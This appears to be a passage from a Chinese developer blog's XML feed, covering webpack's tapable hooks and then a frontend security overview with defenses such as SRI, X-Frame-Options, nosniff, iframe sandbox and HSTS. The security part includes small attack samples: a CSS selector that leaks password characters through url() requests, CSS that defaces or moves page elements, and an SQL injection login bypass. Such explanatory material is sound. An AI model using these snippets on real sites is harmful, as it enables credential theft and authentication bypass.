class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### Tabable是什么</span><br><span class="line"></span><br><span class="line">tapable库暴露了很多Hook（钩子）类，为插件提供挂载的钩子。</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">const &#123;</span><br><span class="line">    SyncHook,</span><br><span class="line">    SyncBailHook,</span><br><span class="line">    SyncWaterfallHook,</span><br><span class="line">    SyncLoopHook,</span><br><span class="line">    AsyncParallelHook,</span><br><span class="line">    AsyncParallelBailHook,</span><br><span class="line">    AsyncSeriesHook,</span><br><span class="line">    AsyncSeriesBailHook,</span><br><span class="line">    AsyncSeriesWaterfallHook</span><br><span class="line"> &#125; = require(&quot;tapable&quot;);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">- tabpack提供了同步&amp;异步绑定钩子的方法，并且他们都有绑定事件和执行事件对应的方法。</span><br><span class="line"></span><br><span class="line">Async*                        Sync*</span><br><span class="line">绑定：tapAsync/tapPromise/tap 绑定：tap</span><br><span class="line">执行：callAsync/promise        执行：call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*** Tabable的其他方法 *** </span><br><span class="line">typefunction  </span><br><span class="line">Hook所有钩子的后缀  </span><br><span class="line">Waterfall同步方法，但是它会传值给下一个函数  </span><br><span class="line">Bail熔断：当函数有任何返回值，就会在当前执行函数停止  </span><br><span class="line">Loop监听函数返回true表示继续循环，返回undefine表示结束循环  </span><br><span class="line">Sync同步方法  </span><br><span class="line">AsyncSeries异步串行钩子  </span><br><span class="line">AsyncParallel异步并行执行钩子  </span><br><span class="line"></span><br><span class="line">#### 用法：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">const &#123; SyncHook &#125; = require(&apos;tapable&apos;);</span><br><span class="line">const mySyncHook = new SyncHook([&apos;name&apos;, &apos;age&apos;]);</span><br><span class="line">mySyncHook.tap(&apos;1&apos;, function (name, age) &#123;</span><br><span class="line">    console.log(name, age, 1)</span><br><span class="line">    return &apos;wrong&apos; // 不关心返回值 这里写返回值对结果没有任何影响</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mySyncHook.tap(&apos;2&apos;, function (name, age) &#123;</span><br><span class="line">    console.log(name, age, 2)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mySyncHook.tap(&apos;3&apos;, function (name, age) &#123;</span><br><span class="line">    console.log(name, age, 3)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mySyncHook.call(&apos;liushiyu&apos;, &apos;18&apos;);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">- tap接收两个参数，第一个参数是名称（没有任何意义）第二个参数是一个函数 接收一个参数.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and ~</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">const &#123;</span><br><span class="line">SyncHook,</span><br><span class="line">SyncBailHook,</span><br><span class="line">SyncWaterfallHook,</span><br><span class="line">SyncLoopHook,</span><br><span class="line">AsyncParallelHook,</span><br><span class="line">AsyncParallelBailHook,</span><br><span class="line">AsyncSeriesHook,</span><br><span class="line">AsyncSeriesBailHook,</span><br><span class="line">AsyncSeriesWaterfallHook</span><br><span class="line"> &#125; = require(&quot;tapable&quot;);</span><br><span class="line">const hook = new SyncHook([&quot;arg1&quot;, &quot;arg2&quot;, &quot;arg3&quot;]);</span><br><span class="line">//The best practice is to expose all hooks of a class in a hooks property:</span><br><span class="line"></span><br><span class="line">class Car &#123;</span><br><span class="line">constructor() &#123;</span><br><span class="line">this.hooks = &#123;</span><br><span class="line">accelerate: new SyncHook([&quot;newSpeed&quot;]),</span><br><span class="line">brake: new SyncHook(),</span><br><span class="line">calculateRoutes: new AsyncParallelHook([&quot;source&quot;, &quot;target&quot;, &quot;routesList&quot;])</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* ... */</span><br><span class="line">&#125;</span><br><span class="line">//Other people can now use these hooks:</span><br><span class="line"></span><br><span class="line">const myCar = new Car();</span><br><span class="line"></span><br><span class="line">// Use the tap method to add a consument</span><br><span class="line">myCar.hooks.brake.tap(&quot;WarningLampPlugin&quot;, () =&gt;  &#123;console.log(`it&apos;s work`)&#125;);</span><br><span class="line"></span><br><span class="line">myCar.hooks.brake.call()</span><br></pre></td></tr></table></figure><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><h3 id="订阅"><a href="#订阅" class="headerlink" title="订阅"></a>订阅</h3><p>SyncHook.tap(‘xx’)<br>（其中tap 继承自Hook）<br>this.taps = [];<br>-&gt; this._insert(options);</p><h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>SyncHook.call<br>Hook.prototype 上的_call 方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperties(Hook.prototype, &#123;</span><br><span class="line">_call: &#123;</span><br><span class="line">value: createCompileDelegate(&quot;call&quot;, &quot;sync&quot;),</span><br><span class="line">configurable: true,</span><br><span class="line">writable: true</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>createCompileDelegate -&gt; _createCall -&gt; HookCodeFactory -&gt;  create  返回fn 。然后执行封装过的工厂函数<br>返回对应的的value。</p><h4 id="SyncHook"><a href="#SyncHook" class="headerlink" title="SyncHook"></a>SyncHook</h4><p>同步串行不关心订阅函数执行后的返回值是什么。其原理是将监听(订阅)的函数存放到一个数组中, 发布时遍历数组中的监听函数并且将发布时的 arguments传递给监听函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class SyncHook &#123;</span><br><span class="line">  constructor(options) &#123;</span><br><span class="line">    this.options = options</span><br><span class="line">    this.hooks = []  // 缓存订阅的事件</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * 订阅事件</span><br><span class="line">   * @param name</span><br><span class="line">   * @param callback</span><br><span class="line">   */</span><br><span class="line">  tap(name, callback) &#123;</span><br><span class="line">    this.hooks.push(callback)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * 发布事件</span><br><span class="line">   * @param args</span><br><span class="line">   */</span><br><span class="line">  call(...args) &#123;</span><br><span class="line">    this.hooks.forEach(task =&gt; task(...args))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SyncWaterfallHook"><a href="#SyncWaterfallHook" class="headerlink" title="SyncWaterfallHook"></a>SyncWaterfallHook</h4><p>同步串行瀑布流, 瀑布流指的是第一个监听函数的返回值,做为第二个监听函数的参数。第二个函数的返回值作为第三个监听函数的参数,依次类推…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const syncWaterfallHook = new SyncWaterfallHook(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">syncWaterfallHook.tap(&apos;name&apos;, data =&gt; &#123;</span><br><span class="line">console.log(&apos;name&apos;, data)</span><br><span class="line">return 23</span><br><span class="line">&#125;)</span><br><span class="line">syncWaterfallHook.tap(&apos;age&apos;, data =&gt; &#123;</span><br><span class="line">console.log(&apos;age&apos;, data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">syncWaterfallHook.call(&apos;qiqingfu&apos;)</span><br></pre></td></tr></table></figure><p>伪实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class SyncWaterfallHook &#123;</span><br><span class="line">    constructor () &#123;</span><br><span class="line">        this.hooks = [];</span><br><span class="line">    &#125;</span><br><span class="line">    tap (name, fn) &#123;</span><br><span class="line">        this.hooks.push(fn)</span><br><span class="line">    &#125;</span><br><span class="line">    call () &#123;</span><br><span class="line">        let result = null</span><br><span class="line">        for(let i=0; i&lt; this.hooks.length; i++) &#123;</span><br><span class="line">            let hook = this.hooks[i];</span><br><span class="line">            if (!i) &#123;</span><br><span class="line">                result = hook(...arguments)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                result = hook(result)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>实际的比这个复杂一些。</li><li>奠定了webpack插件体系的基础</li><li>看明白这个就可以读webpack代码了</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tapable&quot;&gt;&lt;a href=&quot;#tapable&quot; class=&quot;headerlink&quot; title=&quot;tapable&quot;&gt;&lt;/a&gt;tapable&lt;/h2&gt;&lt;p&gt;Webpack 本质上是一种事件流的机制，它的工作流程就是将各个插件串联起来，而实现这一切的核心就是
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>聊聊前端安全</title>
    <link href="http://swingboy.github.io/2018/11/23/%E8%81%8A%E8%81%8A%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    <id>http://swingboy.github.io/2018/11/23/聊聊前端安全/</id>
    <published>2018-11-23T14:34:09.000Z</published>
    <updated>2020-04-27T15:25:07.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="我们遇到的一些问题"><a href="#我们遇到的一些问题" class="headerlink" title="我们遇到的一些问题"></a>我们遇到的一些问题</h2><ul><li>菜鸟组件由lodop更为clodop</li></ul><blockquote><p>chrome已经不会支持npapi插件（npapi可以任意访问系统资源，权限非常大）</p></blockquote><ul><li><p>vipLevel等</p></li><li><p>cookie 验证</p></li><li><p>我们的跨域问题、移动端、webview</p></li><li><p>备注、留言等XSS过滤</p></li></ul><h3 id="提前总结："><a href="#提前总结：" class="headerlink" title="提前总结："></a>提前总结：</h3><ul><li>安全问题的本质是信任的问题</li><li>安全问题的缘由浏览器和传输协议</li><li>sop（同源策略）是最基本的安全功能</li></ul><p><em>接下来，我们会说一说常用到的，常听到、常遇到的一些安全问题。</em></p><h2 id="不安全的第三方依赖"><a href="#不安全的第三方依赖" class="headerlink" title="不安全的第三方依赖"></a>不安全的第三方依赖</h2><p>轻微的有，对于第三方的图片链接。应用方可能在无法同步到第三方更改的同时，导致了一些我们自己这边的或许能称之为安全问题的问题。</p><p>对于jQuery的正则缺陷导致的XSS，以及node、ssh框架导致的服务挂掉的问题。</p><p>插件CSS-Keylogging对键盘的记录<br><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">https://github.com/maxchehab/CSS-Keylogging</a></p><p><strong>办法：</strong><br>自动化检查工具，比如NSP(Node Security Platform)、Snyk</p><h2 id="本地存储数据泄露"><a href="#本地存储数据泄露" class="headerlink" title="本地存储数据泄露"></a>本地存储数据泄露</h2><p>localstorage、sessionstorage、cookie….</p><p>重要数据不要放客户端<br>重要数据不要放客户端<br>重要数据不要放客户端  </p><h2 id="缺乏静态资源完整性校验"><a href="#缺乏静态资源完整性校验" class="headerlink" title="缺乏静态资源完整性校验"></a>缺乏静态资源完整性校验</h2><p>出于性能考虑，前端应用通常会把一些静态资源js、css存放到CDN上面。可以显著提高前端应用的访问速度，却也隐含了安全风险。</p><p>如果攻击者劫持了CDN，或者对CDN中的资源进行了污染，那么我们的前端应用拿到的就是有问题的JS脚本或者css文件，使得攻击者可以肆意篡改我们的前端页面，完成攻击。这种攻击方式造成的效果和XSS跨站脚本攻击有些相似，不过不同点在于攻击者是从CDN开始实施的攻击，而传统的XSS攻击则是从有用户输入的地方开始下手的。</p><p><strong>防御</strong><br>SRI（Subresource Integrity）</p><p>子资源完整性(SRI)是允许浏览器检查其获得的资源（例如从 CDN 获得的）是否被篡改的一项安全特性。它通过验证获取文件的哈希值是否和你提供的哈希值一样来判断资源是否被篡改。</p><p>每个资源文件都可以有一个SRI值，它由两部分组成，减号（-）左侧是生成SRI值用到的哈希算法名，右侧是经过Base64编码后的该资源文件的Hash值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;“https://example.js”&quot; integrity=&quot;“sha384-eivAQsRgJIi2KsTdSnfoEGIRTo25NCAqjNJNZalV63WKX3Y51adIzLT4So1pk5tX”&quot;/&gt;</span><br></pre></td></tr></table></figure><p>浏览器在处理这个script元素的时候，就会检查对应的JS脚本文件的完整性，看其是否和script元素中integrity属性指定的SRI值一致，如果不匹配，浏览器则会中止对这个JS脚本的处理。</p><p>integrity 属性值以 shaXXX- 开头，表示后面的哈希值使用的哈希算法，目前只允许 sha256、sha384 或 sha512 这三种哈希算法，以 sha384 比较多见。后面跟对应的哈希值即可。</p><p>值得注意的是，因为启用 SRI 需要获取所下载文件的内容进行计算，所以需要 CDN 服务器启用跨域资源访问（CORS）支持，即返回 Access-Control-Allow-Origin: * 头。客户端需要使用跨域的形式加载指定文件，即添加 crossorigin=”anonymous” 属性。</p><p>SRI的使用</p><p>首先，我们通过 GitHub 的页面源代码看一下 SRI如何使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link crossorigin=&quot;anonymous&quot; href=&quot;https://assets-cdn.github.com/assets/github-aef3088517c60128e10c5cce8d392985504018745a58a13691f1a278951852bb.css&quot; integrity=&quot;sha256-rvMIhRfGASjhDFzOjTkphVBAGHRaWKE2kfGieJUYUrs=&quot; media=&quot;all&quot; rel=&quot;stylesheet&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;script crossorigin=&quot;anonymous&quot; integrity=&quot;sha256-+Ec97OckLaaiDVIxNjSIGzl1xSzrqh5sOBV8DyYYVpE=&quot; src=&quot;https://assets-cdn.github.com/assets/frameworks-f8473dece7242da6a20d52313634881b3975c52cebaa1e6c38157c0f26185691.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以使用 sha256 算法生成摘要签名，并进行 Base64 编码,如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://example.com/static/js/other/zepto.js | openssl dgst -sha256 -binary | openssl enc -base64 -A</span><br><span class="line"></span><br><span class="line">结果：b/TAR5GfYbbQ3gWQCA3fxESsvgU4AbP4rZ+qu1d9CuQ=</span><br></pre></td></tr></table></figure><p>如果失败了呢？ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script crossorigin=&quot;anonymous&quot; integrity=&quot;sha256-xxxx&quot; src=&quot;http://cdn.example.com/js/jquery.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(!window.jQuery) &#123;</span><br><span class="line">    document.write(&apos;&lt;scr&apos; + &apos;ipt src=&quot;/js/jquery.js&quot;&gt;&lt;/scr&apos; + &apos;ipt&gt;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="点击劫持（clickjacking）"><a href="#点击劫持（clickjacking）" class="headerlink" title="点击劫持（clickjacking）"></a>点击劫持（clickjacking）</h2><p>有一种叫做图片覆盖攻击，点击劫持的一种。</p><p>攻击者使用一张或多张图片，利用图片的style或者能够控制的CSS，将图片覆盖在网页上，形成点击劫持。当然图片本身所带的信息可能就带有欺骗的含义，类似一些广告等或者其他欺骗行为。也有一些用插件的办法投放的。</p><p>可以思考下什么是攻击和欺骗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;xxx&quot;&gt;</span><br><span class="line">&lt;img src=&quot;XXXXXX&quot; style=&quot;position:absolute;top:80px;left:220px;&quot; /&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>点击劫持攻击与CSRF攻击有些类似。都是在用户不知情的情况下诱使用户完成一些动作。（与下面会提到的iframe中可能出现的问题也有些类似。）</p><p><strong><em>办法：</em></strong><br>甄选插件的安全，以及对嵌入的内容过滤。</p><p>HTTP中X-Frame-Options响应头是用来给浏览器指示允许一个页面可否在 &lt;frame&gt;, &lt;iframe&gt; 或者 &lt;object&gt;中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持的攻击。</p><h2 id="错误的内容推断"><a href="#错误的内容推断" class="headerlink" title="错误的内容推断"></a>错误的内容推断</h2><p>有这么一个场景： </p><p>某网站允许用户在评论里上传图片，攻击者在上传图片的时候，看似提交的是个图片文件，实则是个含有JavaScript的脚本文件。该文件逃过了文件类型校验，在服务器里存储了下来。</p><p>接下来，受害者在访问这段评论的时候，浏览器会去请求这个伪装成图片的JavaScript脚本，而此时如果浏览器错误的推断了这个响应的内容类型（MIME types），那么就会把这个图片文件当做JavaScript脚本执行，于是攻击也就成功了。</p><blockquote><p>问题的关键就在于，后端服务器在返回的响应中设置的Content-Type Header仅仅只是给浏览器提供当前响应内容类型的建议，而浏览器有可能会自作主张的根据响应中的实际内容去推断内容的类型。</p></blockquote><p>在上面的例子中，后端通过Content-Type Header建议浏览器按照图片来渲染这次的HTTP响应，但是浏览器发现响应中其实是JavaScript，于是就擅自做主把这段响应当做JS脚本来解释执行，安全问题也就产生了。</p><p>防御<br>浏览器根据响应内容来推断其类型，本来这是个很“智能”的功能，是浏览器强大的容错能力的体现，但是却会带来安全风险。要避免出现这样的安全问题，办法就是通过设置X-Content-Type-Options这个HTTP Header明确禁止浏览器去推断响应类型。</p><blockquote><p>如果设置x-content-type-options之后，后端服务器返回的Content-Type建议浏览器按照图片进行内容渲染，浏览器发现有X-Content-Type-OptionsHTTP Header的存在，并且其参数值是nosniff，因此不会再去推断内容类型，而是强制按照图片进行渲染，那么因为实际上这是一段JS脚本而非真实的图片，因此这段脚本就会被浏览器当作是一个已经损坏或者格式不正确的图片来处理，而不是当作JS脚本来处理，从而最终防止了安全问题的发生。</p></blockquote><h2 id="你认为没什么的CSS"><a href="#你认为没什么的CSS" class="headerlink" title="你认为没什么的CSS"></a>你认为没什么的CSS</h2><p>我故意分出来，是为了显示在这种类问题的重要性。</p><p>我们知道如果页面加载一个js脚本，在未知是否安全的情况下，是很可怕的事情。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://xxx.com/script.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果是加载一份css呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://xxx.com/style.css&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>同样也会带来一定的风险问题。</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input[type=&quot;password&quot;][value$=&quot;p&quot;] &#123;</span><br><span class="line">  background: url(&apos;/password?p&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果输入框的 value 属性值以 p 结尾，上述代码将会向 /password?p 发起请求。每个字符都可触发这个操作，通过它能获取到很多数据。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  display: none;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">html::after &#123;</span><br><span class="line">  content: &apos;HTTP 500 Server Error&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>让页面消失</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.price-value::before &#123;</span><br><span class="line">  content: &apos;1&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>添加内容</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.delete-everything-button &#123;</span><br><span class="line">  opacity: 0;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 500px;</span><br><span class="line">  left: 300px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>移动内容</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.login-button:hover &#123;</span><br><span class="line">  background: url(&apos;/login-button-hover&apos;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">.login-button:active &#123;</span><br><span class="line">  background: url(&apos;/login-button-active&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>监听交互</p></blockquote><h2 id="iframe-风险"><a href="#iframe-风险" class="headerlink" title="iframe 风险"></a>iframe 风险</h2><p>如同前面提到的，会有一些iframe可以做点击劫持。这是另一种形式的攻击。点击劫持大部分是引用我们自己的页面或者网站。这里要说的iframe风险是指我们嵌入了第三方的内容。</p><p>如果iframe中的域名因为过期而被恶意攻击者抢注，或者第三方被黑客攻破，iframe中的内容被替换掉了，从而利用用户浏览器中的安全漏洞下载安装木马等</p><p><strong>防御</strong><br>在HTML5中，iframe有了一个叫做sandbox的安全属性，通过它可以对iframe的行为进行限制。使用sandbox的最简单的方式就是只在iframe元素中添加上这个关键词就好，就像下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox src=&quot;...&quot;&gt;xxx&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>sandbox还忠实的实现了“Secure By Default”原则，也就是说，如果你只是添加上这个属性而保持属性值为空，那么浏览器将会对iframe实施史上最严厉的调控限制，基本上就是除了允许显示静态资源以外，其他什么都做不了。比如不准提交表单、不准弹窗、不准执行脚本等，连Origin都会被强制重新分配一个唯一的值，换句话讲就是iframe中的页面访问它自己的服务器都会被算作跨域请求。</p><p>另外，sandbox也提供了丰富的配置参数。一些典型的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allow-forms：允许iframe中提交form表单  </span><br><span class="line">allow-popups：允许iframe中弹出新的窗口或者标签页（例如，window.open()，showModalDialog()，target=”_blank”等等）</span><br><span class="line">allow-scripts：允许iframe中执行JavaScript</span><br><span class="line">allow-same-origin：允许iframe中的网页开启同源策略</span><br></pre></td></tr></table></figure><blockquote><p>既要控制被iframe 也要小心其他外域iframe</p></blockquote><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>请看上一篇</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>请看上一篇</p><h2 id="http-相关抓包、代理等"><a href="#http-相关抓包、代理等" class="headerlink" title="http 相关抓包、代理等"></a>http 相关抓包、代理等</h2><p>某种意义上也可以认为是一种类型攻击，有点儿牵强。</p><p>fiddler、WINPCAP、nginx</p><p><strong>防御：</strong></p><p>当然是选择https。</p><h2 id="启用HTTPS还出现的问题"><a href="#启用HTTPS还出现的问题" class="headerlink" title="启用HTTPS还出现的问题"></a>启用HTTPS还出现的问题</h2><p>为了信息在传输过程中不被泄露，保证安全，使用HTTPS。即使是服务器端开启了HTTPS，也还是存在安全隐患，可以利用SSL Stripping这种攻击手段，强制让HTTPS降级回HTTP，从而继续进行中间人攻击。</p><p>问题的本质在于浏览器发出去第一次请求就被攻击者拦截了下来并做了修改，根本不给浏览器和服务器进行HTTPS通信的机会。</p><p><strong>过程：</strong><br>用户在浏览器里输入URL的时候往往不是从https://开始的，而是直接从域名开始输入，随后浏览器向服务器发起HTTP通信，攻击者把服务器端返回的跳转到HTTPS页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。由于这一切都是暗中进行的，所以使用前端应用的用户对此毫无察觉。</p><p><strong><em>办法:</em></strong><br>解决这个安全问题的办法是使用HSTS（HTTP Strict Transport Security），它通过下面这个HTTP Header以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性的使用HTTPS，而不是通过明文的HTTP进行通信：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strict-Transport-Security: max-age=; includeSubDomains; preload</span><br></pre></td></tr></table></figure><blockquote><p>这次302跳转是由浏览器触发的，服务器无法完全控制</p></blockquote><h2 id="其他的隐患问题"><a href="#其他的隐患问题" class="headerlink" title="其他的隐患问题"></a><strong><em>其他的隐患问题</em></strong></h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt; </span><br><span class="line">     请输入用户名与密码：&lt;BR&gt; </span><br><span class="line">     &lt;input name=&quot;name&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input name=&quot;password&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>服务端sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;SELECT * FROM users WHERE name = &apos;&quot; + name + &quot;&apos; AND password = &apos;&quot; + password + &quot;&apos;&quot;;</span><br></pre></td></tr></table></figure><p>攻击者尝试sql输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = &apos;&apos;</span><br><span class="line">password = &apos;&apos;  or 1=1</span><br></pre></td></tr></table></figure><p>这样，后台接收到数据后，实际上查询的是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name = &apos;&apos;&apos;&apos; AND password = &apos;&apos;&apos;&apos; or 1=1</span><br></pre></td></tr></table></figure><h3 id="国际化域名字形欺骗攻击"><a href="#国际化域名字形欺骗攻击" class="headerlink" 